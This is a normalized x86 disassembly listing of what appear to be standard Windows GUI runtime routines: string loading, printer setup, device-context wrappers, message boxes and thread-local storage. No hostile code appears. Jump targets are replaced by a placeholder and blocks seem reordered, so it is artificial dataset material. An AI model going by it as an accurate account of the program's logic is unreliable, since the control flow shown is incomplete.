mov ebp esp
sub esp 0x104
push esi
mov esi 0x100
push edi
lea eax [ ebp - 0x104 ]
push esi
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
call sub_1001768d
mov edi eax
mov eax esi
sub eax edi
cmp eax 0x2
jbe r-xdata
push ebx
mov edi esi
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_10014576
xor eax eax
test edi edi
setg al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add edi esi
push edi
lea eax [ edi - 0x1 ]
push eax
call sub_1001459d
push eax
push [ ebp + 0x8 ]
call sub_1001768d
mov ebx eax
mov eax edi
sub eax ebx
cmp eax 0x2
jle r-xdata
mov ecx [ ebp - 0x4 ]
push 0xffffffff
call sub_100145ec
xor eax eax
test ebx ebx
setg al
pop ebx
pop edi
pop esi
leave
retn 0x4
sub_1001768d
push esi
call sub_10018d2c
push [ esp + 0x10 ]
mov esi [ esp + 0x10 ]
mov eax [ eax + 0xc ]
push esi
push [ esp + 0x10 ]
push eax
call [ LoadStringA@IAT ]
test eax eax
jne r-xdata
pop esi
retn 0xc
and [ esi ] al
sub_100176b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
xor edi edi
mov eax [ esi + 0x98 ]
cmp eax edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov ebx [ GlobalLock@IAT ]
push eax
call ebx
movzx ecx [ eax + 0x2 ]
push [ ebp + 0x8 ]
add ecx eax
push ecx
call [ lstrcmpA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push edi
push eax
push [ ebp + 0x8 ]
call OpenPrinterA
test eax eax
je r-xdata
mov eax [ esi + 0x94 ]
cmp eax edi
je r-xdata
push edi
push edi
push edi
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push edi
call DocumentPropertiesA
push eax
push 0x42
call [ GlobalAlloc@IAT ]
push eax
mov [ esi + 0x94 ] eax
call ebx
push 0x2
push edi
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push edi
call DocumentPropertiesA
cmp eax 0x1
je r-xdata
push eax
call sub_10017976
push [ ebp - 0x4 ]
call ClosePrinter
push [ esi + 0x94 ]
call sub_10017976
mov [ esi + 0x94 ] edi
sub_10017761
mov eax sub_10019c62
call sub_10004904
push esi
call sub_10018d52
mov esi eax
cmp [ esi + 0x18 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x18 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_100179ac
call sub_1001461c
push 0x48
mov ebx eax
call sub_1001462e
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x4
push r--data
call sub_10013db4
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x18 ] eax
call sub_1001461c
pop ebx
sub_10017806
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_10017761
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_100134a3
sub_10017846
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
push 0xfffffff0
push [ ebp + 0x8 ]
call [ GetWindowLongA@IAT ]
and eax 0xf
cmp eax [ ebp + 0xc ]
je r-xdata
leave
retn 0x8
lea eax [ ebp - 0xc ]
push 0xa
push eax
push [ ebp + 0x8 ]
call [ GetClassNameA@IAT ]
lea eax [ ebp - 0xc ]
push r--data
push eax
call [ lstrcmpiA@IAT ]
neg eax
sbb eax eax
inc eax
sub_10017890
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp + 0xc ]
push edi
push eax
push [ ebp + 0x8 ]
call [ ClientToScreen@IAT ]
mov edi [ GetWindow@IAT ]
push 0x5
push [ ebp + 0x8 ]
xor eax eax
push esi
call [ GetDlgCtrlID@IAT ]
cmp ax 0xffff
je r-xdata
push 0x2
push esi
jmp r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax __dos_header
je r-xdata
call edi
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call [ GetWindowRect@IAT ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push eax
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
pop edi
pop esi
leave
retn 0xc
sub_10017905
push ebp
mov ebp esp
sub esp 0x100
push esi
push [ ebp + 0xc ]
call [ lstrlenA@IAT ]
mov esi eax
mov eax 0x100
cmp esi eax
ja r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ SetWindowTextA@IAT ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowTextA@IAT ]
cmp eax esi
jne r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x100 ]
push eax
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
pop esi
leave
retn 0x8
sub_10017976
push edi
mov edi [ esp + 0x8 ]
test edi edi
je r-xdata
pop edi
retn 0x4
push edi
call [ GlobalFlags@IAT ]
and eax 0xff
mov ecx eax
dec eax
test ecx ecx
je r-xdata
push edi
call [ GlobalFree@IAT ]
push esi
lea esi [ eax + 0x1 ]
push edi
call [ GlobalUnlock@IAT ]
dec esi
jne r-xdata
pop esi
sub_100179ac
push esi
call sub_10018afa
mov esi eax
test esi esi
je r-xdata
call sub_1001311c
xor eax eax
pop esi
retn
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_10004a5e
pop ecx
mov ecx [ esp + 0x8 ]
lea edx [ ecx + 0x4 ]
cmp eax edx
ja r-xdata
sub eax ecx
sub eax 0x4
push eax
push [ esi + 0xc ]
call sub_100050e2
pop ecx
pop ecx
push [ esi + 0xc ]
call sub_1000413e
and [ esi + 0xc ] 0x0
pop ecx
jmp r-xdata
push 0x1
pop eax
pop esi
retn
sub_10017a2e
mov eax sub_10019c9e
call sub_10004904
push esi
call sub_10018d52
mov esi eax
cmp [ esi + 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x1c ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_100179ac
call sub_1001461c
push 0x48
mov ebx eax
call sub_1001462e
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x2
push 0x4
push r--data
call sub_10013db4
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x1c ] eax
call sub_1001461c
pop ebx
sub_10017ab5
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x14 ]
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_10017a2e
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_100134a3
sub_10017ae6
mov eax sub_10019cb0
call sub_10004904
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ ecx + 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_10017ab5
push eax
call [ DeleteDC@IAT ]
sub_10017b3a
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov edi [ SaveDC@IAT ]
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
push eax
call edi
mov ebx eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
push eax
call edi
test eax eax
je r-xdata
or ebx 0xffffffff
sub_10017b6b
push esi
mov esi ecx
push edi
mov edi [ RestoreDC@IAT ]
mov ecx [ esi + 0x4 ]
push 0x1
cmp ecx [ esi + 0x8 ]
pop eax
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
test eax eax
je r-xdata
xor eax eax
push [ esp + 0xc ]
push esi
call edi
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
sub_10017ba9
push ebx
push esi
push edi
mov esi ecx
push [ esp + 0x10 ]
call [ GetStockObject@IAT ]
mov ecx [ esi + 0x4 ]
mov edi [ SelectObject@IAT ]
mov ebx eax
xor eax eax
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push ebx
push ecx
call edi
push eax
call sub_10017f19
pop edi
pop esi
pop ebx
retn 0x4
push ebx
push esi
call edi
sub_10017be5
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
xor eax eax
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SelectObject@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
push eax
call sub_10017f19
pop edi
pop esi
pop ebx
retn 0x4
test ebx ebx
jne r-xdata
push eax
push ecx
call edi
mov eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
xor eax eax
jmp r-xdata
push eax
push esi
call edi
sub_10017c2b
push esi
mov esi ecx
or eax 0xffffffff
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetBkColor@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_10017c5a
push esi
mov esi ecx
or eax 0xffffffff
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetTextColor@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_10017c89
push esi
mov esi ecx
xor eax eax
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetMapMode@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_10017cb7
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetViewportOrgEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_10017d03
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ OffsetViewportOrgEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_10017d4f
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetViewportExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_10017d9b
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ ScaleViewportExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x14
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_10017df3
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetWindowExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_10017e3f
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ ScaleWindowExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x14
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_10017ea7
mov eax sub_10019cc6
call sub_10004904
push esi
call sub_10018d52
mov esi eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x20 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_100179ac
call sub_1001461c
push 0x48
mov ebx eax
call sub_1001462e
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x4
push r--data
call sub_10013db4
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x20 ] eax
call sub_1001461c
pop ebx
sub_10017f2e
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_10017ea7
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_100134a3
sub_10017f6e
push esi
call sub_10003856
mov esi eax
test esi esi
je r-xdata
pop esi
retn 0x4
mov eax [ esi ]
mov ecx esi
call [ eax + 0xb0 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x68 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push [ esp + 0x8 ]
call [ eax + 0x64 ]
sub_10017f9c
push ebp
mov ebp esp
sub esp 0x114
push ebx
push esi
push edi
xor ebx ebx
mov edi ecx
push ebx
mov [ ebp - 0x10 ] edi
call sub_10017f6e
lea eax [ ebp - 0x4 ]
push eax
push ebx
call sub_10018114
xor esi esi
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
cmp edi ebx
je r-xdata
push ebx
push ebx
push 0x376
push [ ebp - 0x4 ]
call [ SendMessageA@IAT ]
cmp eax ebx
je r-xdata
cmp esi ebx
mov [ ebp - 0x8 ] ebx
je r-xdata
lea esi [ edi + 0x9c ]
mov esi eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
test bl 0xf0
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
test edi edi
je r-xdata
mov eax ebx
and eax 0xf
cmp eax 0x1
jbe r-xdata
add eax 0x30000
mov [ esi ] eax
lea eax [ ebp - 0x114 ]
push 0x104
push eax
push 0x0
lea edi [ ebp - 0x114 ]
call [ GetModuleFileNameA@IAT ]
mov edi [ edi + 0x78 ]
jmp r-xdata
or ebx 0x30
cmp eax 0x2
jbe r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
push ebx
push edi
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
call [ MessageBoxA@IAT ]
test esi esi
mov edi eax
je r-xdata
cmp eax 0x4
ja r-xdata
mov ecx [ ebp - 0x10 ]
push 0x1
call sub_10017f6e
mov eax edi
pop edi
pop esi
pop ebx
leave
retn 0xc
push 0x1
push [ ebp - 0x4 ]
call [ EnableWindow@IAT ]
sub_10018083
push ebp
mov ebp esp
call sub_10018d2c
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
push [ ebp + 0x10 ]
xor ecx ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10017f9c
push [ ebp + 0x10 ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0x8c ]
jmp r-xdata
pop ebp
retn 0xc
sub_100180bb
mov eax sub_10019c38
call sub_10004904
push ecx
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_10017609
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
push esi
push eax
push [ ebp + 0xc ]
push [ ebp - 0x10 ]
call sub_10018083
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
mov esi eax
call sub_100144cd
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
mov eax [ ebp + 0x8 ]
sub_10018114
push ebx
mov ebx [ GetParent@IAT ]
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
test ebp ebp
mov esi ebp
jne r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x40000000
je r-xdata
call sub_100181b0
test eax eax
jne r-xdata
test esi esi
mov edi esi
mov eax esi
je r-xdata
push esi
call ebx
mov esi eax
jmp r-xdata
mov esi [ eax + 0x1c ]
call sub_10003856
test eax eax
jne r-xdata
test ebp ebp
jne r-xdata
push eax
mov edi eax
call ebx
test eax eax
jne r-xdata
test esi esi
je r-xdata
xor esi esi
mov ebx [ esp + 0x18 ]
test ebx ebx
je r-xdata
test esi esi
je r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
test edi edi
je r-xdata
push esi
call [ GetLastActivePopup@IAT ]
mov esi eax
and [ ebx ] 0x0
push edi
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
cmp edi esi
je r-xdata
push 0x0
push edi
mov [ ebx ] edi
call [ EnableWindow@IAT ]
jmp r-xdata
sub_100181bc
push ebp
mov ebp esp
sub esp 0x100
lea eax [ ebp - 0x100 ]
push 0x100
push eax
push [ ebp + 0xc ]
call sub_1001768d
test eax eax
je r-xdata
leave
retn 0x10
push [ ebp + 0x14 ]
lea eax [ ebp - 0x100 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_100181f6
sub_100181f6
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi esi
cmp [ esi ] bl
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx ebx
call sub_1001459d
mov edi eax
mov cl [ edi ]
cmp cl 0x25
jne r-xdata
sub edi [ ebx ]
mov ecx ebx
push edi
call sub_100145ec
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov cl [ esi ]
cmp cl 0x25
jne r-xdata
movzx eax cl
test [ eax + rw-data ] 0x4
je r-xdata
mov al [ edi + 0x1 ]
cmp al 0x30
jl r-xdata
movzx eax cl
test [ eax + rw-data ] 0x4
je r-xdata
mov al [ esi + 0x1 ]
cmp al 0x30
jl r-xdata
inc edi
inc ebx
inc edi
cmp al 0x41
jl r-xdata
cmp al 0x39
jle r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
inc esi
jmp r-xdata
mov [ edi ] cl
inc edi
inc esi
cmp al 0x41
jl r-xdata
cmp al 0x39
jle r-xdata
cmp al 0x5a
jg r-xdata
movsx eax al
sub eax 0x31
cmp [ esi ] 0x0
je r-xdata
cmp al 0x5a
jg r-xdata
movsx eax al
sub eax 0x31
cmp al 0x39
jle r-xdata
inc ebx
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + eax * 4 ]
test eax eax
je r-xdata
cmp al 0x39
jle r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + eax * 4 ]
test eax eax
je r-xdata
mov [ edi ] 0x3f
inc edi
jmp r-xdata
movsx eax al
sub eax 0x38
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
push eax
call [ lstrlenA@IAT ]
add ebx eax
jmp r-xdata
movsx eax al
sub eax 0x38
jmp r-xdata
push eax
push edi
call [ lstrcpyA@IAT ]
push edi
call [ lstrlenA@IAT ]
add edi eax
jmp r-xdata
inc edi
inc edi
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc esi
inc esi
cmp eax [ ebp + 0x14 ]
jl r-xdata
sub_10018322
mov eax sub_10019999
call sub_10004904
push ecx
push 0x118
call sub_10018440
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_10018a54
sub_10018356
mov eax sub_100199ad
call sub_10004904
push ecx
push 0x3c
call sub_10018440
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_10018c23
sub_100183fa
mov edx [ ecx ]
test edx edx
jne r-xdata
push esi
mov esi [ esp + 0x8 ]
xor eax eax
cmp edx esi
jne r-xdata
xor eax eax
jmp r-xdata
test edx edx
je r-xdata
mov eax [ ecx + 0x4 ]
mov eax [ eax + esi ]
mov [ ecx ] eax
jmp r-xdata
retn 0x4
pop esi
mov ecx [ ecx + 0x4 ]
push edi
push 0x1
pop eax
test edx edx
pop edi
je r-xdata
mov edx edi
test edx edx
jne r-xdata
mov eax [ ecx + esi ]
mov [ ecx + edx ] eax
mov edi [ ecx + edx ]
cmp edi esi
je r-xdata
sub_10018472
push esi
mov esi ecx
xor eax eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x18 ] 0x4
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x1
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ esi ] eax
jne r-xdata
lea eax [ esi + 0x1c ]
push eax
call [ InitializeCriticalSection@IAT ]
mov eax esi
pop esi
retn
call sub_1001311c
sub_100184b4
push esi
mov esi ecx
push edi
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call [ TlsFree@IAT ]
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edi [ eax + 0x4 ]
push 0x0
push eax
mov ecx esi
call sub_100187c1
test edi edi
mov eax edi
jne r-xdata
add esi 0x1c
push esi
call [ DeleteCriticalSection@IAT ]
pop edi
pop esi
retn
push eax
call [ GlobalHandle@IAT ]
mov edi eax
push edi
call [ GlobalUnlock@IAT ]
push edi
call [ GlobalFree@IAT ]
sub_1001850b
push ecx
push ecx
push ebp
push esi
mov esi ecx
push edi
lea eax [ esi + 0x1c ]
push eax
mov [ esp + 0x14 ] eax
call [ EnterCriticalSection@IAT ]
mov ebp [ esi + 0x4 ]
mov edi [ esi + 0x8 ]
cmp edi ebp
jge r-xdata
push 0x1
pop edi
cmp ebp edi
jle r-xdata
mov eax [ esi + 0x10 ]
test [ eax + edi * 8 ] 0x1
je r-xdata
mov eax [ esi + 0x10 ]
add ebp 0x20
test eax eax
push ebx
jne r-xdata
mov eax [ esi + 0x10 ]
add eax 0x8
cmp edi [ esi + 0xc ]
jl r-xdata
push eax
call [ GlobalHandle@IAT ]
mov ebx eax
push ebx
call [ GlobalUnlock@IAT ]
mov eax ebp
push 0x2002
shl eax 0x3
push eax
push ebx
call [ GlobalReAlloc@IAT ]
mov eax ebp
shl eax 0x3
push eax
push 0x2002
call [ GlobalAlloc@IAT ]
jmp r-xdata
cmp edi ebp
jl r-xdata
inc edi
add eax 0x8
cmp edi ebp
jl r-xdata
mov eax [ esi + 0x10 ]
or [ eax + edi * 8 ] 0x1
push [ esp + 0x10 ]
lea eax [ eax + edi * 8 ]
lea eax [ edi + 0x1 ]
mov [ esi + 0x8 ] eax
call [ LeaveCriticalSection@IAT ]
mov eax edi
pop edi
pop esi
pop ebp
pop ecx
pop ecx
retn
lea eax [ edi + 0x1 ]
mov [ esi + 0xc ] eax
push [ esp + 0x10 ]
call ebx
mov ebx eax
mov eax [ esi + 0x4 ]
mov ecx eax
imul ecx ecx 0x1fffffff
add ecx ebp
lea eax [ ebx + eax * 8 ]
shl ecx 0x3
push ecx
push 0x0
push eax
call sub_10004940
add esp 0xc
mov [ esi + 0x10 ] ebx
mov [ esi + 0x4 ] ebp
pop ebx
push [ esi + 0x10 ]
call [ GlobalHandle@IAT ]
push eax
call ebx
push [ esp + 0x14 ]
call [ LeaveCriticalSection@IAT ]
call sub_1001311c
mov ebx [ GlobalLock@IAT ]
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
test [ eax ] 0x1
je r-xdata
sub_1001861d
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
lea eax [ edi + 0x1c ]
push eax
mov [ ebp - 0x4 ] eax
call [ EnterCriticalSection@IAT ]
mov esi [ edi + 0x14 ]
mov ebx [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax [ edi + 0x10 ]
push [ ebp - 0x4 ]
and [ eax + ebx * 8 ] 0xfffffffe
lea eax [ eax + ebx * 8 ]
call [ LeaveCriticalSection@IAT ]
pop edi
pop esi
pop ebx
leave
retn 0x4
cmp ebx [ esi + 0x8 ]
jge r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0xc ]
and [ eax + ebx * 4 ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1001867a
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
push [ esi ]
call [ TlsGetValue@IAT ]
mov edi eax
test edi edi
je r-xdata
push 0x10
call sub_10018440
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea ebx [ edi + 0x8 ]
cmp eax [ ebx ]
jl r-xdata
xor edi edi
mov [ eax ] r--data
mov edi eax
jmp r-xdata
mov eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
pop edi
pop esi
mov [ eax + edx * 4 ] ecx
pop ebx
leave
retn 0x8
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ esi + 0xc ]
push 0x2
shl ecx 0x2
push ecx
push eax
call [ LocalReAlloc@IAT ]
mov eax [ esi + 0xc ]
shl eax 0x2
push eax
push 0x0
call [ LocalAlloc@IAT ]
jmp r-xdata
and [ edi + 0x8 ] 0x0
and [ edi + 0xc ] 0x0
lea ebx [ edi + 0x8 ]
lea eax [ esi + 0x1c ]
push eax
mov [ ebp - 0x4 ] edi
